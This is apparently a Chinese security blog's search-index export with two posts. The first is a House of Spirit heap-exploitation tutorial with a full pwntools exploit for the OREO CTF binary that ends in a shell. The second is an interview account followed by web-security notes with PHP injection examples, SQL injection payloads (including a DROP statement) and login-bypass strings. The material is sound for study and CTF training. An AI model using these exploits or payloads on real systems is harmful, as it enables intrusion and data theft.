<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[hourse of spirit]]></title>
    <url>%2F2020%2F01%2F08%2Fhourse-of-spirit%2F</url>
    <content type="text"><![CDATA[原理解释&emsp;&emsp;House of spirit是the malloc Maleficarum的一种技术。该技术的核心思想是伪造fastbin chunk并将其释放，从而达到分配任意地址的chunk的目的。想要伪造fastbin fake chunk，主要需要绕过free时对其进行的检查： fake chunk的ISMMAP位不能为1，因为free时，如果是mmap的chunk，则会进行单独处理。 fake chunk的地址需要对齐，MALLOC_ALIGN_MASK fake chunk的size大小需要满足fastbin的要求，也需要对齐 fake chunk的nextchunk的大小不能小于2 * size_se，也不能大于av-&gt;system_mem fake chunk对应的fastbin head不能为该chunk，否则会触发double free 相关源码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586 if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) malloc_printerr ("free(): invalid pointer"); /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ // 检查大小是否大于最小的chunk，是否对齐 if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) malloc_printerr ("free(): invalid size"); check_inuse_chunk(av, p); /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ // 检查该chunk是否符合fastbin if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())) &#123; // 检查nextchunk的size是否小于最小chunk要求，或大于系统最大chunk if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ, 0)|| __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, 0)) &#123;bool fail = true; /* We might not have a lock at this point and concurrent modifications of system_mem might result in a false positive. Redo the test after getting the lock. */ // 检查是否有lockif (!have_lock) &#123; __libc_lock_lock (av-&gt;mutex); fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem); __libc_lock_unlock (av-&gt;mutex); &#125;if (fail) malloc_printerr ("free(): invalid next size (fast)"); &#125; // 将chunk的mem部分设置为perturb_byte free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); // 设置fastbin标记位 atomic_store_relaxed (&amp;av-&gt;have_fastchunks, true); // 获取对应fastbin的头指针 unsigned int idx = fastbin_index(size); fb = &amp;fastbin (av, idx); /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P; */ // 使用原子操作将该chunk插入其中 mchunkptr old = *fb, old2; if (SINGLE_THREAD_P) &#123;/* Check that the top of the bin is not the record we are going to add (i.e., double free). */ // 检查上一次插入的chunk是否与p相同，若相同则为double freeif (__builtin_expect (old == p, 0)) malloc_printerr ("double free or corruption (fasttop)");p-&gt;fd = old;*fb = p; &#125; else do&#123; /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) malloc_printerr ("double free or corruption (fasttop)"); p-&gt;fd = old2 = old;&#125; while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been allocated again. */ // 确保插入前后相同 if (have_lock &amp;&amp; old != NULL&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, 0)) malloc_printerr ("invalid fastbin entry (free)"); &#125; 下面我们来做一道题看看 OREOBasic Info：123456[*] '/ctf/work/pwn/fastbin/oreo/oreo' Arch: i386-32-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 该程序的大概逻辑是这样的，这是一个枪支系统。枪支的结构体如下：1234500000000 rifle struc ; (sizeof=0x38, mappedto_5)00000000 descript db 25 dup(?)00000019 name db 27 dup(?)00000034 prev dd ? ; offset00000038 rifle ends 大概功能如下： 添加枪支功能 1234567891011121314151617181920212223242526272829void add_rifles(void)&#123; int32_t iVar1; undefined4 uVar2; int32_t in_GS_OFFSET; int32_t var_10h; int32_t var_ch; uVar2 = _rifles_head; iVar1 = *(int32_t *)(in_GS_OFFSET + 0x14); _rifles_head = sym.imp.malloc(0x38); if (_rifles_head == 0) &#123; sym.imp.puts("Something terrible happened!"); &#125; else &#123; *(undefined4 *)(_rifles_head + 0x34) = uVar2; sym.imp.printf("Rifle name: "); sym.imp.fgets(_rifles_head + 0x19, 0x38, _section..bss); add_End(_rifles_head + 0x19); sym.imp.printf("Rifle description: "); sym.imp.fgets(_rifles_head, 0x38, _section..bss); add_End(_rifles_head); _rifles_counts = _rifles_counts + 1; &#125; if (iVar1 != *(int32_t *)(in_GS_OFFSET + 0x14)) &#123; // WARNING: Subroutine does not return sym.imp.__stack_chk_fail(); &#125; return;&#125; 大致流程是首先将rifles_head储存起来，然后分配一个新的chunk来储存rifles struct，把rifles_head存到0x34的位置把name存到0x19的位置，desc存到开始的位置，然后rifles_count(0x804a2a4)++.这样以来rifles就形成了一条链表。 我们注意到name和desc读入的size都是0x38这里明显存在溢出。 其中add_End()函数是想字符串尾加一个‘\0’ 12345678910111213141516171819202122void add_End(int32_t arg_8h)&#123; int32_t iVar1; int32_t iVar2; char *pcVar3; int32_t in_GS_OFFSET; int32_t var_1ch; int32_t var_10h; int32_t var_ch; iVar1 = *(int32_t *)(in_GS_OFFSET + 0x14); iVar2 = sym.imp.strlen(arg_8h); pcVar3 = (char *)(arg_8h + iVar2 + -1); if (((uint32_t)arg_8h &lt;= pcVar3) &amp;&amp; (*pcVar3 == '\n')) &#123; *pcVar3 = '\0'; &#125; if (iVar1 != *(int32_t *)(in_GS_OFFSET + 0x14)) &#123; // WARNING: Subroutine does not return sym.imp.__stack_chk_fail(); &#125; return;&#125; 查看所有枪支 1234567891011121314151617181920212223void show_added_rifles(void)&#123; int32_t iVar1; int32_t in_GS_OFFSET; int32_t var_14h; int32_t var_10h; int32_t var_ch; iVar1 = *(int32_t *)(in_GS_OFFSET + 0x14); sym.imp.printf("Rifle to be ordered:\n%s\n", 0x8048bb0); var_14h = _rifles_head; while (var_14h != 0) &#123; sym.imp.printf("Name: %s\n", var_14h + 0x19); sym.imp.printf("Description: %s\n", var_14h); sym.imp.puts(0x8048bb0); var_14h = *(int32_t *)(var_14h + 0x34); &#125; if (iVar1 != *(int32_t *)(in_GS_OFFSET + 0x14)) &#123; // WARNING: Subroutine does not return sym.imp.__stack_chk_fail(); &#125; return;&#125; 该函数会遍历rifles链表,然后打印name和desc free所有的rifles 1234567891011121314151617181920212223242526272829void order_rifles(void)&#123; int32_t iVar1; int32_t iVar2; int32_t in_GS_OFFSET; int32_t var_14h; int32_t var_10h; int32_t var_ch; iVar1 = *(int32_t *)(in_GS_OFFSET + 0x14); var_14h = _rifles_head; if (_rifles_counts == 0) &#123; sym.imp.puts("No rifles to be ordered!"); &#125; else &#123; while (var_14h != 0) &#123; iVar2 = *(int32_t *)(var_14h + 0x34); sym.imp.free(var_14h); var_14h = iVar2; &#125; _rifles_head = 0; _order_counts = _order_counts + 1; sym.imp.puts("Okay order submitted!"); &#125; if (iVar1 != *(int32_t *)(in_GS_OFFSET + 0x14)) &#123; // WARNING: Subroutine does not return sym.imp.__stack_chk_fail(); &#125; return;&#125; 这里我们可以看到这个函数会free链表上所有的rifles结构，但是没有设置为NULL。 leave message 12345678910111213141516void leave_message(void)&#123; int32_t iVar1; int32_t in_GS_OFFSET; int32_t var_ch; iVar1 = *(int32_t *)(in_GS_OFFSET + 0x14); sym.imp.printf("Enter any notice you\'d like to submit with your order: "); sym.imp.fgets(_message, 0x80, _section..bss); add_End(_message); if (iVar1 != *(int32_t *)(in_GS_OFFSET + 0x14)) &#123; // WARNING: Subroutine does not return sym.imp.__stack_chk_fail(); &#125; return;&#125; 这里会向*message(0x804a2a8 -&gt; 0x804a2c0)这里写入一段内容,因此我们可以想办法控制message所存储的指针来实现任意写的效果。 利用思路 首先，我们可以覆盖node -&gt; prev，把printf的got地址写入该字段，然后通过show_rifles函数泄漏printf的实际地址。 我们可以在0x804a2a0处伪造一个chunk，由于一个rifle的大小为0x38，因此我们选择伪造size为0x41的fastbin chunk。这时我们发现0x804a2a4即rifles_count，这个值正好是chunk的size字段，因此我们可以在free这个chunk之前 add 0x41个rifles就可以控制其大小。 但是这里还有一点需要注意，我们还需要修改下一个物理相邻chunk的size，我们算了一下偏移，0x804a2a0 + 0x40 = 0x804a2e0,这个地方就是next_chunk的size字段，我们可以通过leave_message()来覆盖这个字段，message即0x804a2c0这里写入一段信息，我们计算一下偏移0x804a2e0 - 0x804a2c0 = 0x20 == 32. 再加上4个字节覆盖掉prev_size,因此一共输入36个字节的padding就能到达size字段。所以paload = ‘\x00’ 36 + p32(0x41) 这里之所以用\x00做padding是因为要把fake_chunk的prev设成null，否则free之后会出错。 最后，我们就重新分配rifle，获得刚刚伪造的chunk，然后覆盖message指针的地址，将其设置为strlen()函数的got地址，然后leave_message()用system()覆盖got表,即可getshell。 到这里思路已经十分明确了，payload如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#! /usr/bin/env python2from pwn import *sh = process("./oreo")elf = ELF("./oreo")libc = ELF("./libc.so.6")context.log_level = "debug"# addressprintf_got = elf.got['printf']log.info("printf_got -&gt; " + hex(printf_got))printf_libc = libc.symbols['printf']log.info("printf_libc -&gt; " + hex(printf_libc))system_libc = libc.symbols['system']log.info("system_libc -&gt; " + hex(system_libc))message_addr = 0x0804a2a8log.info("message_addr -&gt; " + hex(message_addr))strlen_got = elf.got['strlen']log.info("strlen_got -&gt; " + hex(strlen_got))def add_refles(name,desc): sh.sendline("1") sh.sendline(name) sh.sendline(desc)def show_refles(): sh.sendline("2")def leave_message(content): sh.sendline("4") sh.sendline(content)def leak_addr(): name = 'a' * 27 + p32(printf_got) desc = 'b' log.info("name -&gt; " + name) log.info("desc -&gt; " + desc) # add refle and overwrite the prev_riles add_refles(name, desc) # leak printf_addr show_refles() sh.recvuntil("Description: ") sh.recvuntil("Description: ") printf_addr = u32(sh.recvn(4)) log.info("printf_addr -&gt; " + hex(printf_addr)) return printf_addrdef get_system_addr(addr, libc_addr): base = addr - libc_addr system_addr = base + system_libc log.info("system_addr -&gt; " + hex(system_addr)) return system_addrdef fake_chunk(): # We need to make the size of chunk 0x41 for i in range(0x40-1): add_refles(str(i), "fuck u") # make a chunk to set the house into link name = 'a' * 27 + p32(message_addr) desc = "fuck U!" log.info("name -&gt; " + name) log.info("desc -&gt; " + desc) add_refles(name, desc)def order_refles(): sh.sendline("3")def main(): printf_addr = leak_addr() system_addr = get_system_addr(printf_addr, printf_libc) fake_chunk() # The padding's length is from message to the next chunk size # padding = padding * (0xa0 + 0x40 - 0xc0 + 4) + p32(0x41) padding= "\x00\x00\x00\x00"*9 + p32(0x41) leave_message(padding) order_refles() show_refles() # Overwrite the strlen_got name = 'fuck U~' desc = p32(strlen_got) add_refles(name, desc) leave_message(p32(system_addr)+ ";/bin/sh\x00") sh.interactive()main() &emsp;&emsp;这里有个点值得注意，我们最后一步覆盖system_got的时候可以直接传p32(system_addr) + &quot;;/bin/sh\x00&quot;.因为,在strlen被覆盖之后，会执行addEnd()函数，相当于strlen(p32(system_addr) + &quot;;/bin/sh\x00&quot;.)即system(p32(system_addr)) 和 system(&quot;/bin/sh\x00&quot;)这样就可以快速getshell。当然，也可以覆盖其他函数的got表，比如sscanf，然后在输入的action的时候输入/bin/sh也可getshell。]]></content>
      <tags>
        <tag>thinking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[chaitin面试经历]]></title>
    <url>%2F2019%2F12%2F12%2Fchaitin%E9%9D%A2%E8%AF%95%E7%BB%8F%E5%8E%86%2F</url>
    <content type="text"><![CDATA[背景 &emsp;&emsp;求简大佬内推, 2019.12.12去阿里云安全旗下的长亭科技面试, 超级紧张,毕竟是地表最强安全公司. 面试时间15:30,我14:26从806出发,路上吃了碗面,然后找20min没找到地方….后来发现是导航错了.15:26分,到达公司. 看到一堆小零食和一柜子饮料,还有一堆黑客(划掉)安全人员. HR小姐姐人超级好,在微信上和我斗图哈哈哈,然后带来了某巨佬面试我,史上最硬核面试开始了… 面试 后来知道这是P师傅，师傅实在是太强了，现在每天给师傅递茶。:-)&emsp;&emsp;面试官是一位超级和善的安全研究员,先从最简单的开始问我,栈溢出的原理是啥类,linux下二进制保护措施有啥呀,原理是啥呀,咋绕过呀,能不能更给力一点呀同学? 我: 叽里呱啦…. 带佬: 说说Heap segment的结构呗? 我: 首先程序刚开始没有建立Heap Segment,第一次malloc时创建堆段…… 带佬: 简单的说一下malloc_chunk的结构吧 我: 首先他是个结构体……. 带佬: 第一次运行malloc时具体发生了啥鸭? 我: 第一分配内存首先要运行molloc_consolidate然后malloc_init_state进行初始化….. 带佬: unlink有什么问题吗? 我: 可能导致任意写或者地址泄漏,但是高版本的glibc加了验证,几乎不能任意写了 带佬: 对操作系统内核溢出有了解吗? 我: 嘤嘤嘤…没有 带佬: … 带佬: sql注入大概分为那几种啊? 我: 有回显,无回显(盲注) 带佬: 盲注分为哪几种,分别怎么利用 我: 叽里呱啦… 带佬: order by和limit注入分别怎么利用 我: 呱啦叽里… 带佬: ssrf盲打如何操作, 如何验证payload, 如何内网打redis 我: 嘤嘤嘤…不会 带佬: linux下如何代码注入? 如何检测rootkit? 我: 嗯…ptrace? 然后分析流量?…(哭 带佬: …ELF的格式给讲讲呗 我: 啊, 那个头巴拉巴拉…..(勉强萌混过关) 带佬: 还行, 分析过cve么,就前几天那个phpfmp的洞看过吗? 我: …哭 带佬: 了解TLB的原理么,简单说说呗? 还有进程间通信啥的? 我: 巴拉巴拉…对吧…. 带佬: 还能更底层么? 我: …嘤..不会了 带佬: 内网渗透用哪些转发工具 我: lcx frp 带佬: ssh的转发功能用过么? 了解扫描器原理么? 端口显示open close filter意味着什么,从协议角度分析一下. 我: 啊? 啊? 啊?…不会 带佬: … section和segment啥区别呀 我: 一个segment由多个section组成?… 带佬: 恩, 解释性语言的逆向原理了解过么,就pyc那种. 我: …无 带佬: TCP/IP三次握手讲讲呗? 我: 嗯…叽里呱啦..是吧?… 带佬似笑非笑: 你这个cpu怎么写的啊 我(都让让,我要装逼了): 乌啦乌啦…大概就是这样(恩,牛逼吧) 带佬: 还行, linux下的SIGNAL了解么 我: 只是用过,kill -9之类的…原理不懂 带佬: linux熟么? 我(熟的一p): 还行 带佬: 查看端口, 查找内容, 检测流量, 监视进程, 硬件读写,….噼里啪啦问了一堆 我: %^#@!大概就是这样 带佬: 恩,还行.正向shell和反向shell有什么区别? 我: 这样那样… 带佬: 权限维持咋弄啊? 我: crontab…… 带佬: 反序列化讲讲 我: ….嗯嗯大概这样 带佬: 固件提取咋整啊 我: 编程器搞出来, binwalk看一看, ida擼一撸 带佬: binwalk分析不出来咋正呀? 我: 啊? 还能这样? 带佬: magic number被去掉了或者elf结构乱了你分析个啥啊 我: 嗷嗷嗷… 带佬: 还行吧,我简单介绍一下我们部门….噼里啪啦…看你个人选择吧,我们这边偏业务研究,综合性比较强,楼下偏理论,负责打比赛搞名气的. 我: 都行都行 带佬: 有啥要问我的么? 我: 能发offer么 带佬: …还行, 我去叫hr 我: … 超级nice的HR姐姐 &emsp;&emsp;HR姐姐就问了问性格啥的, 能来几天啊, 为啥干这个呀, 然后开始跟她将笑话…嗯… HR姐姐: 我们一天300 我(woc这么多): 嗯, 还行 HR姐姐: 包吃 我(woc还包吃): 哦, 不错哦 HR姐姐: 有啥要问得嘛?加个微信呗? 我(加加加): 能给offer么?哭哭 HR姐姐: 哈哈哈这两天会通知你结果. 结果 &emsp;&emsp;出来的时候才意识到只有一次技术面,看网上都是好几面…但是感觉挺稳的,毕竟相谈甚欢,赶紧问问简大佬 大概过了一个小时, 简大老和我说稳了….耶! 点个外卖奖励一下自己. 基础知识整理&emsp;&emsp;整理了一下基础知识, 整理了一半web突然发现我是想申二进制来着…不管了 web php 变量覆盖 extract()变量覆盖 1int extract ( array $var_array [, int $extract_type [, string $prefix ]]) extract()函数将一个键值数组数组中的值导入符号表.第三个参数可以设置为EXTR_SKIP避免覆盖,默认为EXRE_OVERWRITE. parse_str()1void parse_str ( string $str [, array &amp;$arr ]) parse_str()将字符串解析到变量中.例如: 12345678910&lt;?php $a = 'oop'; parse_str($_SERVER["QUERY_STRING"]); if ($a == 'fuck') &#123; echo "Hacked!"; &#125; else &#123; echo "Hello!"; &#125;?&gt; 构造payload: curl “127.0.0.1?a=fuck” $$value 类型覆盖php中变量值可作为第二个变量的名.例如:123456$a = "hello";$$a = "world";echo "$a $$a"; // helloworldecho "$a $&#123;$a&#125;"; //helloworldecho "$&#123;"hello"&#125;"; //world 因此foreach在遍历数组时可能导致覆盖,例如: 12345678910111213&lt;?phpforeach (array('_COOKIE','_POST','_GET') as $_request) &#123; foreach ($$_request as $_key=&gt;$_value) &#123; $$_key= $_value; &#125;&#125;$id = isset($id) ? $id : "test"; if($id === "fuck") &#123; echo "flag&#123;xxxxxxxxxx&#125;";&#125; else &#123; echo "Nothing...";&#125;?&gt; ?id=fuck 可覆盖id变量 import_request_variables()1bool import_request_variables (string $types [, string $prefix]) $type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀.例如: 12345678910&lt;?php $a = "0"; import_request_variables("G"); if ($a == 1) &#123; echo "Fucked!"; &#125; else &#123; echo "Nothing!"; &#125;?&gt; ?a=1 就会echo fucked 反序列化 将json转化为实例后恶意执行代码,例: 123456789101112&lt;?php class test&#123; public $flag = "flag&#123;233&#125;"; protected $b = "b"; private $c = "c";&#125;$test = new test();$data = serialize($test);echo $data;?&gt; 得到: 1O:4:"test":3:&#123;s:4:"flag";s:9:"flag&#123;233&#125;";s:4:"*b";s:1:"b";s:7:"testc";s:1:"c";&#125; 一般以type:length:content;这种格式存在.要注意两点 protected类型属性名会变成 – %00*%00属性名 private类型属性名会变成 – %00类名%00属性名 相关magic方法必须知道的魔法方法：这里就不得不介绍几个我们必须知道的魔法方法了 construct()：当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。 wakeup() ：unserialize()时会自动调用 destruct()：当对象被销毁时会自动调用。 toString():当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用 get() :当从不可访问的属性读取数据 call(): 在对象上下文中调用不可访问的方法时触发 利用phar://扩展攻击面参考文章 魔法函数 sleep() 和 wakeup() construct() 和 destruct() __toString() invoke() 和 call() get() 和 set() 危险函数 system() 1system ( string $command [, int &amp;$return_var ] ) shell_exec() 1shell_exec ( string $cmd ) exec() 1exec( string $cmd ) passthru() 1passthru ( string $command [, int &amp;$return_var ] ) assert() 如果assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 1assert ( mixed $assertion [, string $description ] ) popen()1resource popen ( string command, string mode ) 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用 pclose() 来关闭。此指针可以用于 fgets()，fgetss() 和 fwrite(). proc_open()1resource proc_open ( string cmd, array descriptorspec, array &amp;pipes [, string cwd [, array env [, array other_options]]] ) 与popen类似，但是可以提供双向管道。具体的参数读者可 以自己翻阅php manual 注意：A. 后面需要使用proc_close()关闭资源，并且如果是 pipe 类型，需要用 pclose() 关闭句柄。B. proc_open 打开的程序作为 php 的子进程，php 退出后该子进程也会退出。 其他 pfsockopen() syslog() openlog() chroot() chown() scandir() 伪协议 123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 php:// php://filter在双off的情况下也可以正常使用； 条件： 不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启 allow_url_include php://filter php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 1234resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分 隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于 读或写链。 php://filter/read=convert.base64-encode/resource=upload.php这里读的过滤器为convert.base64-encode，就和字面上的意思一样，把输入流base64-encode。resource=upload.php，代表读取upload.php的内容 php://input php://input 是个可以访问请求的原始数据的只读流,可以读取到post没有解析的原始数据, 将post请求中的数据作为PHP代码执行。因为它不依赖于特定的 php.ini 指令。 注：enctype=”multipart/form-data” 的时候 php://input 是无效的。 12allow_url_fopen ：off/onallow_url_include：on file:// data:// 等 参考文章 文件包含 include() inlcude_onec() require() require_once() 各种伪协议 参考文章 命令执行 见危险函数和反序列化 常见框架 ThinkPHP RCE Inject Laravel Inject (比较鸡肋) Unserialize 太强了 Zend Lumen SQL Inject 盲注 基于Bool 基于时间 基于报错 这一部分知识点爆炸多 基于Bool一般这种注入要求我们构造逻辑判断,通常需要我们截取字符串然后进行比对. 常用的截取函数: mid() substr() left() MID()函数1MID(column_name,start[,length]) column_name 必需 要提取字符的字段 start 必需 规定开始位置(起始值是 1) length 可选 要返回的字符数,如果省略,则 MID()函数返回剩余文本 Eg: str=”123456” mid(str,2,1) 结果为2 用例: 1MID(DATABASE(), 1, 1) &gt; 'a' 查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字 符。 1MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1) &gt;'a' 此处column_name参数可以为sql语句，可自行构造sql语句进行注入。 SUBSTR()函数Substr()和substring()函数实现的功能是一样的,均为截取字符串. 12string substring(string, start, length)string substr(string, start, length) 参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。 用例： 1substr(DATABASE(), 1, 1) &gt; 'a' 查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。 1substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1, 1) &gt; 'a' 此处string参数可以为sql语句，可自行构造sql语句进行注入。 LEFT()函数Left()得到字符串左部指定个数的字符 1Left ( string, n ) string为要截取的字符串,n为长度. 用例： 1left(database(),1)&gt;'a' 查看数据库名第一位 1left(database(),2)&gt; 'ab' 查看数据库名前二位。 同样的string可以为自行构造的sql语句。 ORD()函数同时也要介绍ORD()函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。 例如: 1ORD(MID(DATABASE(), 1, 1)) &gt; 114 意为检测database()的第一位ASCII码是否大于114,也即是’r’ 构造方式字符串函数构造 1ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+ //substr()函数，ascii()函数 正则构造 12345select user() regexp '^[a-z]'; select * from users where id=1 and 1=(user() regexp'^ri'); select * from users where id=1 and 1=(if((user() regexp '^r'),1,0)); like匹配注入 1Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a; 这个和正则差不多 基于时间if判断语句，条件为假，执行sleep 1If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 原理大多类似,要求网速比较好 基于报错得到表名： 1select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)); 当数字大于BIGINT溢出后mysql会报错, 这里的BIGINT是 !0 1234567MariaDB [(none)]&gt; select ~0;+----------------------+| ~0 |+----------------------+| 18446744073709551615 |+----------------------+1 row in set (0.000 sec) 然后实验如下: 123456789101112131415MariaDB [(none)]&gt; select (select*from(select user())x);+-------------------------------+| (select*from(select user())x) |+-------------------------------+| root@localhost |+-------------------------------+1 row in set (0.006 sec) MariaDB [(none)]&gt; select !(select*from(select user())x);+--------------------------------+| !(select*from(select user())x) |+--------------------------------+| 1 |+--------------------------------+1 row in set, 1 warning (0.001 sec) 因此,只要我们触发溢出错误即可,但是这种方式只适用于较低版本的mysql我的MariaDB做了相关保护: 12MariaDB [(none)]&gt; select !(select*from(select user())x) - ~0;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '!(select #) - ~0' 期望的内容被 ‘#’ 代替了.同理,在insert update语句中也可构造溢出: 123insert into users (id, username, password) values (2, '' or !(select*from(select user())x)-~0 or '', 'Eyre'); update users set password='Peter' or !(select*from(select user())x)-~0 or '' where id=4; 参考文章:BIGINTBlind Inject order by注入 盲注 触发报错 &emsp;&emsp;其实原理与上面类似, 首先熟悉一下order by, 他是mysql中对查询数据进行排序的方法,使用示例: 12select * from 表名 order by 列名(或者数字) asc；升序(默认升序)select * from 表名 order by 列名(或者数字) desc；降序 &emsp;&emsp;这里的重点在于order by后既可以填列名或者是一个数字。举个例子： id是user表的第一列的列名，那么如果想根据id来排序，有两种写法: 12select * from user order by id;selecr * from user order by 1; Union盲注123456789101112$sql = 'select * from admin where username='".$username."'';$result = mysql_query($sql);$row = mysql_fetch_array($result);if(isset($row)&amp;&amp;row['username']!="admin")&#123; $hit="username error!";&#125;else&#123; if ($row['password'] === $password)&#123; $hit=""; &#125;else&#123; $hit="password error!"; &#125;&#125; payload 1username=admin' union 1,2,'字符串' order by 3 //' 此时sql语句变为: 1select * from admin where username='admin' or 1 union select 1,2,binary '字符串' order by 3; &emsp;&emsp;这里就会对第三列进行比较，即将字符串和密码进行比较。然后就可以根据页面返回的不同情况进行盲注。 注意的是最好加上binary，因为order by比较的时候不区分大小写。例如: 123456789101112131415161718192021222324252627282930mysql&gt; select * from order1;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | admin | uP10AcB |+------+----------+----------+mysql&gt; select * from order1 where username='' or 1 union select 1,2,'v' order by 3;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | admin | uP10AcB || 1 | 2 | v |+------+----------+----------+mysql&gt; select * from order1 where username='' or 1 union select 1,2,'a' order by 3;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | 2 | a || 1 | admin | uP10AcB |+------+----------+----------+mysql&gt; select * from order1 where username='' or 1 union select 1,2,'u' order by 3;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | 2 | u || 1 | admin | uP10AcB |+------+----------+----------+ &emsp;&emsp;这里的order by 3是根据第三列进行排序，如果我们union查询的字符串比password小的话，我们构造的 1,2,a就会成为第一列，那么在源码对用户名做对比的时候，就会返回username error!，如果union查询的字符串比password大，那么正确的数据就会是第一列，那么页面就会返回password error!. 基于if()盲注需要知道列名的情况:&emsp;&emsp;order by的列不同，返回的页面当然也是不同的，所以就可以根据排序的列不同来盲注。 1order by if(1=1,id,username); &emsp;&emsp;这里如果使用数字代替列名是不行的，因为if语句返回的是字符类型,不是整型. 不必知道列名:payload: 1order by if(表达式,1,(select id from information_schema.tables)) &emsp;&emsp;如果表达式为false时，sql语句会报ERROR 1242 (21000): Subquery returns more than 1 row的错误，导致查询内容为空，如果表达式为true是，则会返回正常的页面。 基于时间1234567 order by if(1=1,1,sleep(1)) ``` 测试: ```sql select * from ha order by if(1=1,1,sleep(1)); #正常时间 select * from ha order by if(1=2,1,sleep(1)); #有延迟 &emsp;&emsp;测试的时候发现延迟的时间并不是sleep(1)中的1秒，而是大于1秒。 最后发现延迟的时间和所查询的数据的条数是成倍数关系的.计算公式: 1延迟时间=sleep(1)的秒数*所查询数据条数 &emsp;&emsp;我所测试的表中有四条数据,所以延迟了4秒。如果查询的数据很多时，延迟的时间就会很长了。 在写脚本时，可以添加timeout这一参数来避免延迟时间过长这一情况。 ###### 基于rand()的盲注 原理与上面类似,看例子: 1234567891011121314151617181920mysql&gt; select * from ha order by rand(true);+----+------+| id | name |+----+------+| 9 | NULL || 6 | NULL || 5 | NULL || 1 | dss || 0 | dasd |+----+------+mysql&gt; select * from ha order by rand(false);+----+------+| id | name |+----+------+| 1 | dss || 6 | NULL || 0 | dasd || 5 | NULL || 9 | NULL |+----+------+ 可以看到当rand()为true和false时，排序结果是不同的，所以就可以使用rand()函数构造表达式进行盲注了. 1order by rand(ascii(mid((select database()),1,1))&gt;96) ###### 基于报错 *updatexml* 12select * from ha order by updatexml(1,if(1=1,1,user()),1);#查询正常select * from ha order by updatexml(1,if(1=2,1,user()),1);#查询报错 *extractvalue* 12select * from ha order by extractvalue(1,if(1=1,1,user()));#查询正常select * from ha order by extractvalue(1,if(1=2,1,user()));#查询报错 堆叠注入(Stacking Queries) 一句代码之中执行多个查询语句，这在每一个注入点都非常有用，尤其是使用SQL Server后端的应用 1; SELECT * FROM members; DROP members -- 支持堆叠查询的语言/数据库绿色：支持，暗灰色：不支持，浅灰色：未知 万能密码 admin’ – #’ admin’ # #’ admin’/* #’ ‘ or 1=1– #’ ‘ or 1=1# #’ ‘ or 1=1/* #’ ‘) or ‘1’=’1– #’ ‘) or (‘1’=’1– #’ 